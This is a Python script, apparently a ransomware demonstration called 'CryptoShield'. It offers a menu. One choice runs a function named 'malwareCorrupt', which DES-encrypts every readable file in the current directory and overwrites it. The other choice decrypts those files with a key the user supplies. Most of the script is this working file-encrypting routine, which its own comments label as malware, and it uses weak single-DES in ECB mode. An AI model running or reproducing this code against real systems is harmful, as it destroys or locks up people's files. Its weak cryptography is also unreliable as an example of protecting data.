import os
import pyDes
import random
import colorama

# init the colorama
colorama.init(autoreset=True)

# store all the possible colors in an array
colors = [colorama.Fore.BLUE , colorama.Fore.CYAN, colorama.Fore.LIGHTMAGENTA_EX, colorama.Fore.YELLOW]


# Heading

heading = """
   _____                  _           _____ _     _      _     _ 
  / ____|                | |         / ____| |   (_)    | |   | |
 | |     _ __ _   _ _ __ | |_ ___   | (___ | |__  _  ___| | __| |
 | |    | '__| | | | '_ \| __/ _ \   \___ \| '_ \| |/ _ | |/ _` |
 | |____| |  | |_| | |_) | || (_) |  ____) | | | | |  __| | (_| |
  \_____|_|   \__, | .__/ \__\___/  |_____/|_| |_|_|\___|_|\__,_|
               __/ | |                                           
              |___/|_|      

                         ________      ___    ___ 
                        |\   __  \    |\  \  /  /|
                        \ \  \|\ /_   \ \  \/  / /
                         \ \   __  \   \ \    / / 
                          \ \  \|\  \   \/  /  /  
                           \ \_______\__/  /  /    
                            \|_______|\___/  /     
                                      \|___|/      
                                                
                                                               

            ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà    ‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 
            ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà    ‚ñà‚ñà     ‚ñà‚ñà  ‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà      
            ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà     ‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 
            ‚ñà‚ñà    ‚ñà‚ñà ‚ñà‚ñà         ‚ñà‚ñà       ‚ñà‚ñà    ‚ñà‚ñà           ‚ñà‚ñà 
             ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà         ‚ñà‚ñà       ‚ñà‚ñà     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 
                                                   
                                                   
        """

""" DES Encryption """

def Encrypt(text, key):

    # DES encryption object with the given key
    des = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)

    # text to bytes
    text = text.encode('utf-8')

    # Encrypt the data
    encryptedData = des.encrypt(text)

    # Convert the encrypted Data to hexadecimal
    encryptedData = encryptedData.hex()

    # return the encrypted Data
    return encryptedData



""" DES Decryption """

def Decrypt(text, key):

    # DES encryption object with the given key
    des = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)

    # hex to bytes
    text = bytes.fromhex(text)

    # Encrypt the text
    text = des.decrypt(text)

    # Convert the encrypted bytes to string
    decrypted_hex = text.decode('utf-8')

    # return the decrypted text
    return decrypted_hex



""" Encryption Key """
letters = [chr(ASCIIValue) for ASCIIValue in range(33, 127)]
key = ''
for i in range(10):
    key += letters[random.randint(0, len(letters)-1)]

key = key.encode('utf-8')

# padding the key to make it exactly 8 bytes
def pad(key):
    paddingValue = 8 - len(key)
    return key[:8] if len(key) >= 8 else (key + bytes(str(paddingValue) * paddingValue, encoding='utf-8'))



""" Files Degradation by Malware"""

def malwareCorrupt(key):

    # get all the files in the current directory
    files = os.listdir()

    # show all the files in the current directory
    for file in files:
        if file in ['CryptoShield.py', 'CryptoShield1.py', 'imageEncryption.py', 'temp.py']:
            continue
        print(f"\n\n\nFound {colors[random.randint(0, len(colors)-1)] + file} file\n")

        # Encrypt the file

        try:
            f = open(file, 'r')
            data = f.read()
            f.close()

            encryptedData = Encrypt(data, key)

            f = open(file, 'w')

            f.write(encryptedData)

            f.close()

            print(colorama.Fore.RED + f"üîê Encrypted {file} file successfully...")
        except:
            print(colorama.Fore.GREEN + f" ü•≤ Skipped {file}")



""" Remediation from Malware"""

def remediation(key):

    # get all the files in the current directory
    files = os.listdir()

    # show all the files in the current directory
    for file in files:

        # skip python malware files
        if file in ['CryptoShield.py', 'CryptoShield1.py', 'imageEncryption.py', 'temp.py']:
            continue
        print(f"\n\n\nFound {colors[random.randint(0, len(colors)-1)] + file} file\n")

        # Decrypt the file
        try:
            f = open(file, 'r')
            data = f.read()
            f.close()

            decryptedData = Decrypt(data, key)

            f = open(file, 'w')

            f.write(decryptedData)

            f.close()

            print(colorama.Fore.GREEN + f"üîêüîëüîì Decrypted {file} file successfully...")
        except:
            print(colorama.Fore.MAGENTA + f" ü§ê Skipped {file}")


""" Options """

print(colorama.Fore.GREEN + heading)

option = input(f"type {colorama.Fore.RED + '1'} for encryption, {colorama.Fore.GREEN + '2'} for decryption: ")

if option == '1':
    print(colorama.Fore.YELLOW + '\n\n\t\t\t\t\tEncryption Started.....\n')
    needKey = input(colorama.Fore.LIGHTCYAN_EX + 'Do you have encryption key(yes/no): ' + colorama.Fore.RESET) == 'yes'
    key = input(colorama.Fore.MAGENTA + '\nType the Encryption Key:' + colorama.Fore.RESET).encode('utf-8') if needKey else key
    key = pad(key)
    print(f"Encryption key (8 Bytes) = {colorama.Fore.LIGHTBLUE_EX + key.decode('utf-8')}")
    malwareCorrupt(key)
    print("\n\n üòÆ Corrupted All the files üòê\n\n")
else:
    print(colorama.Fore.YELLOW + '\n\n\t\t\t\t\tDecryption Started.....\n')
    needKey = input(colorama.Fore.LIGHTCYAN_EX + 'Do you have decryption key(yes/no): ' + colorama.Fore.RESET) == 'yes'
    key = input(colorama.Fore.MAGENTA + '\nType the Decryption Key:' + colorama.Fore.RESET).encode('utf-8') if needKey else key
    key = pad(key)
    print(f"Decryption key (8 Bytes)= {colorama.Fore.LIGHTBLUE_EX + key.decode('utf-8')}")
    remediation(key)
    print("\n\n üòå Recovered All the files\n\n")

